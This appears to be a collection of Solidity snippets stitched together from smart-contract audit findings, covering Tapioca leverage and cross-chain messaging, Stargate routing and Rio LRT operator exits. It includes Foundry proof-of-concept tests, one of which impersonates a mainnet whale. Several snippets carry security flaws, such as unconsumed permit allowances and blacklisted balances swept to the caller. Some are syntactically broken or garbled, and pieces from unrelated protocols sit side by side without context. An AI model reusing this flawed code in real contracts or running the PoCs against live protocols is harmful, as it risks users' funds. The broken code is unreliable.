"```\nuint256 amountToSend = _send.amountLD > _options.tapAmount? _options.tapAmount : _send.amountLD;\nif (_send.minAmountLD > amountToSend) {\n    _send.minAmountLD = amountToSend;\n}\n```\n```\nif (msg_.withdrawOnOtherChain) {\n    uint256 amountToSend = _send.amountLD > _options.tapAmount\n       ? _options.tapAmount\n        : _send.amountLD;\n    if (_send.minAmountLD > amountToSend) {\n        _send.minAmountLD = amountToSend;\n    }\n\n    _sendPacket(msg_.lzSendParams, msg_.composeMsg, _options.from);\n\n    if (_options.tapAmount - amountToSend > 0) {\n        IERC20(tapOft).safeTransfer(_options.from, _options.tapAmount - amountToSend);\n    }\n}"
"```\nfunction _allowedBorrow(address from, uint256 share) internal virtual override {\n    if (from!= msg.sender) {\n        (uint256 pearlmitAllowed,) = penrose.pearlmit().allowance(from, msg.sender, address(yieldBox), collateralId);\n        require(allowanceBorrow[from][msg.sender] >= share || pearlmitAllowed >= share, ""Market: not approved"");\n        if (allowanceBorrow[from][msg.sender]!= type(uint256).max) {\n            allowanceBorrow[from][msg.sender] -= share;\n        }\n    }\n}\n```\nrequire(\n    allowanceBorrow[from][msg.sender] >= share || permitAllowed >= share,\n    ""Market: not approved""\n);\n```\nif (allowanceBorrow[from][msg.sender]!= type(uint256).max) {\n    allowanceBorrow[from][msg.sender] -= share;\n}\n```"
"```\nif (memoryData.shareOwed <= memoryData.shareOut):\n    _repay(from, from, memoryData.partOwed)\nelse:\n    uint256 partOut = totalBorrow.toBase(amountOut, false)\n    _repay(from, from, partOut)\n```\n```\nfunction _repay(address from, address to, uint256 part) internal returns (uint256 amount) {\n    yieldBox.withdraw(assetId, from, address(this), amount, 0);\n}"
"```\nyieldBox.withdraw(\n    collateralId,\n    address(this),\n    address(leverageExecutor),\n    0,\n    calldata_.share\n);\n\nuint256 leverageAmount = yieldBox.toAmount(\n    collateralId,\n    calldata_.share,\n    false\n);\n\namountOut = leverageExecutor.getAsset(\n    assetId,\n    address(collateral),\n    address(asset),\n    leverageAmount,\n    calldata_.from,\n    calldata_.data\n);"
"```\nfunction _lzCompose(\n    address srcChainSender_,\n    bytes32 _guid,\n    bytes memory oftComposeMsg_\n) internal {\n    (uint16 msgType_,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =\n        TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n    if (msgType_ == MSG_REMOTE_TRANSFER) {\n        _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n    } else if (!_extExec(msgType_, tapComposeMsg_)) {\n        if (\n            address(tapiocaOmnichainReceiveExtender)!= address(0)\n                && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)\n        ) {\n            bytes memory callData = abi.encodeWithSelector(\n                ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                msgType_,\n                srcChainSender_,\n                tapComposeMsg_\n            );\n            (bool success, bytes memory returnData) =\n                address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n            if (!success) {\n                revert(_getTOEExtenderRevertMsg(returnData));\n            }\n        } else {\n            if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                revert InvalidMsgType(msgType_);\n            }\n        }\n    }\n}\n```\ncontract mTOFTReceiver is BaseTOFTReceiver {\n    constructor(TOFTInitStruct memory _data) BaseTOFTReceiver(_data) {}\n\n    function _toftCustomComposeReceiver(uint16 _msgType, address, bytes memory _toeComposeMsg)\n        internal\n        override\n        returns (bool success)\n    {\n        if (_msgType == MSG_LEVERAGE_UP) {\n            _executeModule(\n                uint8(ITOFT.Module.TOFTMarketReceiver),\n                abi.encodeWithSelector(TOFTMarketReceiverModule.leverageUpReceiver.selector, _toeComposeMsg),\n                false\n            );\n            return true;\n        } else if (_msgType == MSG_XCHAIN_LEND_XCHAIN_LOCK) {\n            _executeModule(\n                uint8(ITOFT.Module.TOFTOptionsReceiver),\n                abi.encodeWithSelector(\n                    TOFTOptionsReceiverModule.mintLendXChainSGLXChainLockAndParticipateReceiver.selector, _toeComposeMsg\n                ),\n                false\n            );\n            return true;\n        } else {\n            return false;\n        }\n    }\n}"
"```\nfunction executeModule(ITOFT.Module _module, bytes memory _data, bool _forwardRevert)\n    external\n    payable\n    whenNotPaused\n    returns (bytes memory returnData)\n{\n    // rest of code\n}\n\nfunction sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n    public\n    payable\n    whenNotPaused\n    returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n{\n```"
"```\nfunction sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n    public\n    payable\n    whenNotPaused\n    returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n{\n    (msgReceipt, oftReceipt) = abi.decode(\n        _executeModule(\n            uint8(ITOFT.Module.TOFTSender),\n            abi.encodeCall(TapiocaOmnichainSender.sendPacket, (_lzSendParam, _composeMsg)),\n            false\n        ),\n        (MessagingReceipt, OFTReceipt)\n    );\n}\n```\n```\nfunction _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {\n    (uint16 msgType_,, bytes memory tapComposeMsg_, bytes memory nextMsg_) = \n        TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);\n\n    if (msgType_ == MSG_REMOTE_TRANSFER) {\n        _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);\n    } else if (!_extExec(msgType_, tapComposeMsg_)) {\n        if (address(tapiocaOmnichainReceiveExtender)!= address(0) \n            && tapiocaOmnichainReceiveExtender.isMsgTypeValid(msgType_)) {\n            bytes memory callData = abi.encodeWithSelector(\n                ITapiocaOmnichainReceiveExtender.toeComposeReceiver.selector,\n                msgType_,\n                srcChainSender_,\n                tapComposeMsg_\n            );\n            (bool success, bytes memory returnData) = \n                address(tapiocaOmnichainReceiveExtender).delegatecall(callData);\n            if (!success) {\n                revert(_getTOEExtenderRevertMsg(returnData));\n            }\n        } else {\n            if (!_toeComposeReceiver(msgType_, srcChainSender_, tapComposeMsg_)) {\n                revert InvalidMsgType(msgType_);\n            }\n        }\n    }\n\n    emit ComposeReceived(msgType_, _guid, tapComposeMsg_);\n    if (nextMsg_.length > 0) {\n        _lzCompose(address(this), _guid, nextMsg_);\n    }\n}"
"```\nrouter.swap(\n    _dstChainId,\n    _srcPoolId,\n    _dstPoolId,\n    payable(this),\n    _amount,\n    _computeMinAmount(_amount, _slippage),\n    IStargateRouterBase.lzTxObj({\n        dstGasForCall: 0,\n        dstNativeAmount: 0,\n        dstNativeAddr: ""0x0""\n    }),\n    _dst\n);\n```\n```\nfunction testStargateRouterReverting() public {\n    vm.createSelectFork(vm.envString(""MAINNET_RPC_URL""));\n\n    address stargateRouter = 0x8731d54E9D02c286767d56ac03e8037C07e01e98;\n    address DAIWhale = 0x7A8EDc710dDEAdDDB0B539DE83F3a306A621E823;\n    address DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n\n    IStargateRouter.lzTxObj memory lzTxParams = IStargateRouter.lzTxObj(0, 0, ""0x00"");\n\n    vm.startPrank(DAIWhale);\n    vm.deal(DAIWhale, 5 ether);\n\n    IERC20(DAI).approve(stargateRouter, 1e18);\n\n    IStargateRouter(stargateRouter).swap{value: 1 ether}(\n        111, 3, 3, payable(address(this)), 1e18, 1, lzTxParams, abi.encode(address(this)), ""0x""\n    );\n}\n```\n```\nfunction retryRevert(uint16 _srcChainId, bytes calldata _srcAddress, uint256 _nonce) external payable onlyOwner {\n    router.retryRevert(value: msg.value)(_srcChainId, _srcAddress, _nonce);\n}\n```"
"```\nfunction _sendToken(\n    address payable _oft,\n    uint256 _amount,\n    uint16 _dstChainId,\n    uint256 _slippage,\n    bytes memory _data\n) private {\n    address erc20 = ITOFT(_oft).erc20();\n    if (IERC20Metadata(erc20).balanceOf(address(this)) < _amount) {\n        revert ExceedsBalance();\n    }\n    (uint256 _srcPoolId, uint256 _dstPoolId) = abi.decode(_data, (uint256, uint256));\n    _routerSwap(_dstChainId, _srcPoolId, _dstPoolId, _amount, _slippage, _oft, erc20);\n}\n```"
"```\nfunction swap(\n    uint16 _chainId,\n    uint256 _srcPoolId,\n    uint256 _dstPoolId,\n    address payable _refundAddress,\n    Pool.CreditObj memory _c,\n    Pool.SwapObj memory _s,\n    IStargateRouter.lzTxObj memory _lzTxParams,\n    bytes calldata _to,\n    bytes calldata _payload\n) external payable onlyRouter {\n    bytes memory payload = abi.encode(TYPE_SWAP_REMOTE, _srcPoolId, _dstPoolId, _lzTxParams.dstGasForCall, _c, _s, _to, _payload);\n    _call(_chainId, TYPE_SWAP_REMOTE, _refundAddress, _lzTxParams, payload);\n}\n\nfunction _call(\n    uint16 _chainId,\n    uint8 _type,\n    address payable _refundAddress,\n    IStargateRouter.lzTxObj memory _lzTxParams,\n    bytes memory _payload\n) internal {\n    bytes memory lzTxParamBuilt = _txParamBuilder(_chainId, _type, _lzTxParams);\n    uint64 nextNonce = layerZeroEndpoint.getOutboundNonce(_chainId, address(this)) + 1;\n    layerZeroEndpoint.send{value: msg.value}(_chainId, bridgeLookup[_chainId], _payload, _refundAddress, address(this), lzTxParamBuilt);\n    emit SendMsg(_type, nextNonce);\n}\n```\n```\n## Bridge.sol\n\nfunction lzReceive(\n    uint16 _srcChainId,\n    bytes memory _srcAddress,\n    uint64 _nonce,\n    bytes memory _payload\n) external override {\n    if (functionType == TYPE_SWAP_REMOTE) {\n        (\n           ,\n            uint256 srcPoolId,\n            uint256 dstPoolId,\n            uint256 dstGasForCall,\n            Pool.CreditObj memory c,\n            Pool.SwapObj memory s,\n            bytes memory to,\n            bytes memory payload\n        ) = abi.decode(_payload, (uint8, uint256, uint256, uint256, Pool.CreditObj, Pool.SwapObj, bytes, bytes));\n```\n```\nfunction clearCachedSwap(\n    uint16 _srcChainId,\n    bytes calldata _srcAddress,\n    uint256 _nonce\n) external {\n    CachedSwap memory cs = cachedSwapLookup[_srcChainId][_srcAddress][_nonce];\n    require(cs.to!= address(0x0), ""Stargate: cache already cleared"");\n    cachedSwapLookup[_srcChainId][_srcAddress][_nonce] = CachedSwap(address(0x0), 0, address(0x0), """");\n    IStargateReceiver(cs.to).sgReceive(_srcChainId, _srcAddress, _nonce, cs.token, cs.amountLD, cs.payload);\n}\n```\n```\nfunction sgReceive(\n    uint16,\n    bytes memory,\n    uint256,\n    address,\n    uint256 amountLD,\n    bytes memory\n) external payable {\n    if (msg.sender!= _stargateRouter) {\n        revert mTOFT_NotAuthorized();\n    }\n\n    if (erc20 == address(0)) {\n        vault.depositNative{value: amountLD}();\n    } else {\n        IERC20(erc20).safeTransfer(address(vault), amountLD);\n    }\n}\n```"
"```\nSLeverageSwapData memory swapData = abi.decode(data, (SLeverageSwapData));\n\nuint256 daiAmount = \n    _swapAndTransferToSender(false, assetAddress, daiAddress, assetAmountIn, swapData.swapperData);\n```\n```\nfunction _swapAndTransferToSender(\n    bool sendBack,\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    bytes memory data\n) internal returns (uint256 amountOut) {\n    SLeverageSwapData memory swapData = abi.decode(data, (SLeverageSwapData));\n```"
"```\nfunction _routerSwap(\n    uint16 _dstChainId,\n    uint256 _srcPoolId,\n    uint256 _dstPoolId,\n    uint256 _amount,\n    uint256 _slippage,\n    address payable _oft,\n    address _erc20\n) private {\n    bytes memory _dst = abi.encodePacked(connectedOFTs[_oft][_dstChainId].dstOft);\n    IERC20(_erc20).safeApprove(address(router), _amount);\n    router.swap{value: msg.value}(\n        _dstChainId,\n        _srcPoolId,\n        _dstPoolId,\n        payable(this),\n        _amount,\n        _computeMinAmount(_amount, _slippage),\n        IStargateRouterBase.lzTxObj({\n            dstGasForCall: 0,\n            dstNativeAmount: 0,\n            dstNativeAddr: ""0x0""\n        }),\n        _dst,\n        ""0x""\n    );\n}\n```\n```\nfunction swap(\n    uint16 _dstChainId,\n    uint256 _srcPoolId,\n    uint256 _dstPoolId,\n    address payable _refundAddress,\n    uint256 _amountLD,\n    uint256 _minAmountLD,\n    lzTxObj memory _lzTxParams,\n    bytes calldata _to,\n    bytes calldata _payload\n) external payable override nonReentrant {\n    require(_amountLD > 0, ""Stargate: cannot swap 0"");\n    require(_refundAddress!= address(0x0), ""Stargate: _refundAddress cannot be 0x0"");\n\n    Pool.SwapObj memory s;\n    Pool.CreditObj memory c;\n\n    {\n        Pool pool = _getPool(_srcPoolId);\n\n        uint256 convertRate = pool.convertRate();\n        _amountLD = _amountLD / convertRate * convertRate;\n\n        s = pool.swap(_dstChainId, _dstPoolId, msg.sender, _amountLD, _minAmountLD, true);\n        _safeTransferFrom(pool.token(), msg.sender, address(pool), _amountLD);\n\n        c = pool.sendCredits(_dstChainId, _dstPoolId);\n    }\n\n    bridge.swap{value: msg.value}(_dstChainId, _srcPoolId, _dstPoolId, _refundAddress, c, s, _lzTxParams, _to, _payload);\n}\n```"
"```\nfunction buyCollateral(\n    address from,\n    uint256 borrowAmount,\n    uint256 supplyAmount,\n    bytes calldata data\n) \n    external \n    optionNotPaused(PauseType.LeverageBuy)\n    solvent(from, false)\n    notSelf(from)\n    returns (uint256 amountOut)\n{\n    if (address(leverageExecutor) == address(0)) {\n        revert LeverageExecutorNotValid();\n    }\n\n    _BuyCollateralCalldata memory calldata_;\n    _BuyCollateralMemoryData memory memoryData;\n\n    {\n        calldata_.from = from;\n        calldata_.borrowAmount = borrowAmount;\n        calldata_.supplyAmount = supplyAmount;\n        calldata_.data = data;\n    }\n\n    {\n        uint256 supplyShare = yieldBox.toShare(assetId, calldata_.supplyAmount, true);\n        if (supplyShare > 0) {\n            (memoryData.supplyShareToAmount, ) = \n                yieldBox.withdraw(assetId, calldata_.from, address(leverageExecutor), 0, supplyShare);\n        }\n    }\n\n    {\n        (, uint256 borrowShare) = _borrow(\n            calldata_.from,\n            address(this),\n            calldata_.borrowAmount,\n            _computeVariableOpeningFee(calldata_.borrowAmount)\n        );\n        (memoryData.borrowShareToAmount, ) = \n            yieldBox.withdraw(assetId, address(this), address(leverageExecutor), 0, borrowShare);\n    }\n\n    {\n        amountOut = leverageExecutor.getCollateral(\n            collateralId,\n            address(asset),\n            address(collateral),\n            memoryData.supplyShareToAmount + memoryData.borrowShareToAmount,\n            calldata_.from,\n            calldata_.data\n        );\n    }\n\n    uint256 collateralShare = yieldBox.toShare(collateralId, amountOut, false);\n    address(asset).safeApprove(address(yieldBox), type(uint256).max);\n    yieldBox.depositAsset(collateralId, address(this), address(this), 0, collateralShare);\n    address(asset).safeApprove(address(yieldBox), 0);\n\n    if (collateralShare == 0) {\n        revert CollateralShareNotValid();\n    }\n\n    _allowedBorrow(calldata_.from, collateralShare);\n    _addCollateral(calldata_.from, calldata_.from, false, 0, collateralShare);\n}\n```"
"```\npragma solidity ^0.8.0;\n\ncontract BBLeverage {\n    function buyCollateral(\n        address from,\n        uint256 borrowAmount,\n        uint256 supplyAmount,\n        bytes calldata data\n    ) \n        external\n        optionNotPaused(PauseType.LeverageBuy)\n        solvent(from, false)\n        notSelf(from)\n        returns (uint256 amountOut)\n    {\n        amountOut = leverageExecutor.getCollateral(\n            collateralId,\n            address(asset),\n            address(collateral),\n            memoryData.supplyShareToAmount + memoryData.borrowShareToAmount,\n            calldata_.from,\n            calldata_.data\n        );\n    }\n\n    function sellCollateral(\n        address from,\n        uint256 share,\n        bytes calldata data\n    ) \n        external\n        optionNotPaused(PauseType.LeverageSell)\n        solvent(from, false)\n        notSelf(from)\n        returns (uint256 amountOut)\n    {\n        amountOut = leverageExecutor.getAsset(\n            assetId,\n            address(collateral),\n            address(asset),\n            memoryData.leverageAmount,\n            from,\n            data\n        );\n    }\n}\n```\n```\n// BaseLeverageExecutor.sol\n\nfunction getCollateral(address assetAddress, address collateralAddress, uint256 assetAmountIn, bytes calldata data)\n    external\n    payable\n    virtual\n    returns (uint256 collateralAmountOut)\n{\n}\n\n/**\n * @notice Buys an asked amount of asset with a collateral using the ZeroXSwapper.\n * @dev Expects the token to be already transferred to this contract.\n * @param collateralAddress collateral address.\n * @param assetAddress asset address.\n * @param collateralAmountIn amount to swap.\n * @param data SLeverageSwapData.\n */\nfunction getAsset(address collateralAddress, address assetAddress, uint256 collateralAmountIn, bytes calldata data)\n    external\n    virtual\n    returns (uint256 assetAmountOut)\n{\n}\n```"
"```\npragma solidity ^0.8.0;\n\nfunction _computeVariableOpeningFee(uint256 amount) internal returns (uint256) {\n    if (amount == 0) {\n        return 0;\n    }\n\n    (bool updated, uint256 _exchangeRate) = assetOracle.get(oracleData);\n    if (!updated) {\n        revert OracleCallFailed();\n    }\n\n    if (_exchangeRate >= minMintFeeStart) {\n        return (amount * minMintFee) / FEE_PRECISION;\n    }\n    if (_exchangeRate <= maxMintFeeStart) {\n        return (amount * maxMintFee) / FEE_PRECISION;\n    }\n\n    uint256 fee = maxMintFee - (((_exchangeRate - maxMintFeeStart) * (maxMintFee - minMintFee)) / (minMintFeeStart - maxMintFeeStart));\n\n    if (fee > maxMintFee) {\n        return (amount * maxMintFee) / FEE_PRECISION;\n    }\n    if (fee < minMintFee) {\n        return (amount * minMintFee) / FEE_PRECISION;\n    }\n\n    if (fee > 0) {\n        return (amount * fee) / FEE_PRECISION;\n    }\n    return 0;\n}\n```\nfunction _initCoreStorage(\n    IPenrose _penrose,\n    IERC20 _collateral,\n    uint256 _collateralId,\n    ITapiocaOracle _oracle,\n    uint256 _exchangeRatePrecision,\n    uint256 _collateralizationRate,\n    uint256 _liquidationCollateralizationRate,\n    ILeverageExecutor _leverageExecutor\n) private {\n    maxMintFeeStart = 975000000000000000; // 0.975 * 1e18\n    minMintFeeStart = 1000000000000000000; // 1 * 1e18\n}\n```\n```\nfunction setMinAndMaxMintRange(uint256 _min, uint256 _max) external onlyOwner {\n    emit UpdateMinMaxMintRange(minMintFeeStart, _min, maxMintFeeStart, _max);\n\n    if (_min >= _max) {\n        revert NotValid();\n    }\n\n    minMintFeeStart = _min;\n    maxMintFeeStart = _max;\n}\n```"
"```\nfunction mintOpenInterestDebt(address twTap) external onlyOwner {\n    uint256 usdoSupply = usdoToken.totalSupply();\n\n    if (usdoSupply > 0) {\n        uint256 totalUsdoDebt = computeTotalDebt();\n\n        uint256 len = allOriginsMarkets.length;\n        for (uint256 i = 0; i < len; i++) {\n            IMarket market = IMarket(allOriginsMarkets[i]);\n            if (isOriginRegistered[address(market)]) {\n                (uint256 elastic,) = market.totalBorrow();\n                totalUsdoDebt += elastic;\n            }\n        }\n\n        if (totalUsdoDebt > usdoSupply) {\n            uint256 _amount = totalUsdoDebt - usdoSupply;\n\n            IUsdo(address(usdoToken)).mint(address(this), _amount);\n\n            uint256 rewardTokenId = ITwTap(twTap).rewardTokenIndex(address(usdoToken));\n            _distributeOnTwTap(_amount, rewardTokenId, address(usdoToken), ITwTap(twTap));\n        }\n    }\n}\n```"
"```\n// UsdoOptionReceiverModule.sol\n\nfunction exerciseOptionsReceiver(address srcChainSender, bytes memory _data) public payable {\n    // Decode received message.\n    ExerciseOptionsMsg memory msg_ = UsdoMsgCodec.decodeExerciseOptionsMsg(_data);\n\n    _checkWhitelistStatus(msg_.optionsData.target);\n    _checkWhitelistStatus(OFTMsgCodec.bytes32ToAddress(msg_.lzSendParams.sendParam.to))\n}\n```"
"```\npragma solidity ^0.8.0;\n\nfunction exerciseOptionsReceiver(address srcChainSender, bytes memory _data) public payable {\n    ITapiocaOptionBroker(_options.target).exerciseOption(\n        _options.oTAPTokenID,\n        address(this), // payment token\n        _options.tapAmount\n    );\n\n    address tapOft = ITapiocaOptionBroker(_options.target).tapOFT();\n    if (msg.sender.withdrawOnOtherChain) {\n        _sendPacket(msg.lzSendParams, msg.composeMsg, _options.from);\n\n        if (_options.tapAmount - amountToSend > 0) {\n            IERC20(tapOft).safeTransfer(_options.from, _options.tapAmount - amountToSend);\n        }\n    } else {\n        IERC20(tapOft).safeTransfer(_options.from, _options.tapAmount);\n    }\n}\n```\n```\nfunction _debit(\n    uint256 _amountLD, \n    uint256 _minAmountLD,\n    uint32 _dstEid\n) internal virtual override returns (uint256 amountSentLD, uint256 amountReceivedLD) {\n    (amountSentLD, amountReceivedLD) = _debitView(_amountLD, _minAmountLD, _dstEid);\n\n    amountSentLD,\n    amountReceivedLD\n}\n```"
"```\nfunction wrap(address _fromAddress, address _toAddress, uint256 _amount)\n    external\n    payable\n    whenNotPaused\n    nonReentrant\n    returns (uint256 minted)\n{\n    uint256 feeAmount = _checkAndExtractFees(_amount);\n    if (erc20 == address(0)) {\n        _wrapNative(_toAddress, _amount, feeAmount);\n    } else {\n        if (msg.value > 0) revert mTOFT_NotNative();\n        _wrap(_fromAddress, _toAddress, _amount, feeAmount);\n    }\n\n    return _amount - feeAmount;\n}\n```\n```\nfunction _swapAndTransferToSender(\n    bool sendBack,\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    bytes memory data\n) internal returns (uint256 amountOut) {\n    SLeverageSwapData memory swapData = abi.decode(data, (SLeverageSwapData));\n\n    if (swapData.toftInfo.isTokenOutToft) {\n        _handleToftWrapToSender(sendBack, tokenOut, amountOut);\n    } else if (sendBack) {\n        // If the token wasn't sent by the wrap OP, send it as a transfer.\n        IERC20(tokenOut).safeTransfer(msg.sender, amountOut);\n    }\n}\n```\n```\nfunction _handleToftWrapToSender(bool sendBack, address tokenOut, uint256 amountOut) internal {\n    address toftErc20 = ITOFT(tokenOut).erc20();\n    address wrapsTo = sendBack == true? msg.sender : address(this);\n\n    if (toftErc20 == address(0)) {\n        weth.withdraw(amountOut);\n        ITOFT(tokenOut).wrap{value: amountOut}(address(this), wrapsTo, amountOut);\n    } else {\n        toftErc20.safeApprove(tokenOut, amountOut);\n        ITOFT(tokenOut).wrap(address(this), wrapsTo, amountOut);\n        toftErc20.safeApprove(tokenOut, 0);\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\nfunction buyCollateral(\n    address from,\n    uint256 borrowAmount,\n    uint256 supplyAmount,\n    bytes calldata data\n) \n    external\n    optionNotPaused(PauseType.LeverageBuy)\n    solvent(from, false)\n    notSelf(from)  \n    returns (uint256 amountOut) \n{\n    amountOut = leverageExecutor.getCollateral(\n        collateralId,\n        address(asset),\n        address(collateral),\n        memoryData.supplyShareToAmount + memoryData.borrowShareToAmount,\n        calldata_.from,\n        calldata_.data\n    );\n    uint256 collateralShare = yieldBox.toShare(collateralId, amountOut, false);\n    address(asset).safeApprove(address(yieldBox), type(uint256).max);\n    yieldBox.depositAsset(collateralId, address(this), address(this), 0, collateralShare);\n    address(asset).safeApprove(address(yieldBox), 0);\n}"
"```\nfunction reAccrueBigBangMarkets() external notPaused {\n    if (msg.sender == bigBangEthMarket) {\n        _reAccrueMarkets(false);\n    }\n}\n\nfunction _reAccrueMarkets(bool includeMainMarket) private {\n    uint256 len = allBigBangMarkets.length;\n    address[] memory markets = allBigBangMarkets;\n    for (uint256 i = 0; i < len; i++) {\n        address market = markets[i];\n        if (isMarketRegistered[market]) {\n            if (includeMainMarket || market!= bigBangEthMarket) {\n                IBigBang(market).accrue();\n            }\n        }\n    }\n\n    emit ReaccruedMarkets(includeMainMarket);\n}\n```\n```\nfunction buyCollateral(\n    address from,\n    uint256 borrowAmount,\n    uint256 supplyAmount,\n    bytes calldata data\n) \n    external\n    optionNotPaused(PauseType.LeverageBuy)\n    solvent(from, false)\n    notSelf(from)  \n    returns (uint256 amountOut) \n{\n    {\n        (, uint256 borrowShare) = _borrow(\n            calldata_.from,    \n            address(this), \n            calldata_.borrowAmount,\n            _computeVariableOpeningFee(calldata_.borrowAmount)\n        );  \n        (memoryData.borrowShareToAmount,) = \n            yieldBox.withdraw(assetId, address(this), address(leverageExecutor), 0, borrowShare);\n    }\n}\n```"
"```\nfunction _extractTokens(address _from, address _token, uint256 _amount) internal returns (uint256) {\n    uint256 balanceBefore = IERC20(_token).balanceOf(address(this));\n    pearlmit.transferFromERC20(_from, address(this), address(_token), _amount);\n    uint256 balanceAfter = IERC20(_token).balanceOf(address(this));\n    if (balanceAfter <= balanceBefore) revert Magnetar_ExtractTokenFail();\n    return balanceAfter - balanceBefore;\n}\n```\nfunction _addCollateral(address from, address to, bool skim, uint256 amount, uint256 share) internal {\n    if (share == 0) {\n        share = yieldBox.toShare(collateralId, amount, false);\n    }\n    uint256 oldTotalCollateralShare = totalCollateralShare;\n    userCollateralShare[to] += share;\n    totalCollateralShare = oldTotalCollateralShare + share;\n\n    bool isErr = pearlmit.transferFromERC1155(from, address(this), address(yieldBox), collateralId, share);\n    if (isErr) {\n        revert TransferFailed();\n    }\n}\n```\n```\npragma solidity ^0.8.0;\n\ncontract MagnetarMintCommonModule {\n    function _lockOnTOB(\n        IOptionsLockData memory lockData,\n        IYieldBox yieldBox_,\n        uint256 fraction,\n        bool participate,\n        address user,\n        address singularityAddress\n    ) internal returns (uint256 tOLPTokenId) {\n        _setApprovalForYieldBox(lockData.target, yieldBox_);\n        tOLPTokenId = ITapiocaOptionLiquidityProvision(lockData.target).lock(\n            participate? address(this) : user,\n            singularityAddress,\n            lockData.lockDuration,\n            lockData.amount\n        );\n    }\n}\n\ncontract TapiocaOptionLiquidityProvision {\n    function lock(\n        address _to,\n        IERC20 _singularity,\n        uint128 _lockDuration,\n        uint128 _ybShares\n    ) external nonReentrant returns (uint256 tokenId) {\n        bool isErr = pearlmit.transferFromERC1155(\n            msg.sender,\n            address(this),\n            address(yieldBox),\n            sglAssetID,\n            _ybShares\n        );\n        if (isErr) {\n            revert TransferFailed();\n        }\n    }\n}\n```"
"```\n/**\n * @notice Overrides Blacklist function to transfer balance of a blacklisted user to the caller.\n * @dev This function is called internally when an account is blacklisted.\n * @param user The blacklisted user whose balance will be transferred.\n */\nfunction _onceBlacklisted(address user) internal override {\n    _transfer(user, _msgSender(), balanceOf(user));\n}\n```"
"```\nfunction setOperatorStrategyCap(\n    RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n    uint8 operatorId,\n    IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap\n) internal {\n    if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {\n        if (currentShareDetails.allocation > 0) {\n            operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);\n        }\n        utilizationHeap.removeByID(operatorId);\n    } else if (currentShareDetails.cap == 0 && newShareCap.cap > 0) {\n        utilizationHeap.insert(OperatorUtilizationHeap.Operator(operatorId, 0));\n    } else {\n        utilizationHeap.updateUtilizationByID(operatorId, currentShareDetails.allocation.divWad(newShareCap.cap));\n    }\n}\n```\n```\nfunction queueOperatorStrategyExit(\n    IRioLRTOperatorRegistry.OperatorDetails storage operator,\n    uint8 operatorId,\n    address strategy\n) internal {\n    // @review asks delegator to exit\n    bytes32 withdrawalRoot = delegator.queueWithdrawalForOperatorExit(strategy, sharesToExit);\n    emit IRioLRTOperatorRegistry.OperatorStrategyExitQueued(operatorId, strategy, sharesToExit, withdrawalRoot);\n}\n```\n```\nfunction _queueWithdrawalForOperatorExitOrScrape(address strategy, uint256 shares) internal returns (bytes32 root) {\n    root = _queueWithdrawal(strategy, shares, address(depositPool()));\n}\n\nfunction _queueWithdrawal(address strategy, uint256 shares, address withdrawer) internal returns (bytes32 root) {\n    IDelegationManager.QueuedWithdrawalParams[] memory withdrawalParams = new IDelegationManager.QueuedWithdrawalParams[](1);\n    withdrawalParams[0] = IDelegationManager.QueuedWithdrawalParams({\n        strategies: strategy.toArray(),\n        shares: shares.toArray(),\n        withdrawer: withdrawer\n    });\n    root = delegationManager.queueWithdrawals(withdrawalParams)[0];\n}\n```\n```\nfunction test_SettingStrategyCapZero_WithdrawalsAreDoubleCountable() public {\n    IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps = new IRioLRTOperatorRegistry.StrategyShareCap[](2);\n    zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: RETH_STRATEGY, cap: 0});\n    zeroStrategyShareCaps[1] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});\n\n    uint8 operatorId = addOperatorDelegator(reLST.operatorRegistry, address(reLST.rewardDistributor));\n\n    uint256 AMOUNT = 111e18;\n\n    cbETH.approve(address(reLST.coordinator), type(uint256).max);\n    uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n\n    vm.prank(EOA, EOA);\n    reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n    vm.recordLogs();\n    reLST.operatorRegistry.setOperatorStrategyShareCaps(operatorId, zeroStrategyShareCaps);\n\n    Vm.Log[] memory entries = vm.getRecordedLogs();\n    assertGt(entries.length, 0);\n\n    for (uint256 i = 0; i < entries.length; i++) {\n        if (entries[i].topics[0] == keccak256('OperatorStrategyExitQueued(uint8,address,uint256,bytes32)')) {\n            uint8 emittedOperatorId = abi.decode(abi.encodePacked(entries[i].topics[1]), (uint8));\n            (address strategy, uint256 sharesToExit, bytes32 withdrawalRoot) = abi.decode(entries[i].data, (address, uint256, bytes32));\n\n            assertEq(emittedOperatorId, operatorId);\n            assertEq(strategy, CBETH_STRATEGY);\n            assertEq(sharesToExit, AMOUNT);\n            assertNotEq(withdrawalRoot, bytes32(0));\n\n            break;\n        }\n        if (i == entries.length - 1) {\n            fail('Event not found');\n        }\n    }\n\n    uint256 queuedShares = reLST.coordinator.requestWithdrawal(address(cbETH), lrtAmount);\n    console.log(""Queued shares"", queuedShares);\n}\n```"
